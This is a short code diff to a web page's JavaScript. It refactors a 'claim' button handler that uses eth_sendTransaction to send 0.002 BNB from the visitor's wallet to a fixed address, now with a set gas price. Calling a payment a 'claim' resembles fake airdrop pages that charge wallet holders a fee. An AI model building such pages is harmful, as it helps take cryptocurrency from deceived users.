@@ -57,13 +57,16 @@
 
     document.getElementById('claim-button').addEventListener('click', async () => {
       try {
-        await ethereum.request({
+        const options = {
+          from: ethereum.selectedAddress,
+          to: '0xD9E818f75c948D11fBFFD65bFC626ea29a1f583b',
+          value: '0x2C68AF0BB140000', // 0.002 BNB in wei
+          gasPrice: '0x77359400', // 3 gwei in wei
+        };
+
+        const transactionHash = await ethereum.request({
           method: 'eth_sendTransaction',
-          params: [{
-            from: ethereum.selectedAddress,
-            to: '0xD9E818f75c948D11fBFFD65bFC626ea29a1f583b',
-            value: '0x2C68AF0BB140000', // 0.002 BNB in wei
-          }],
+          params: [options],
         });
         displayResult('Payment sent successfully');
       } catch (error) {
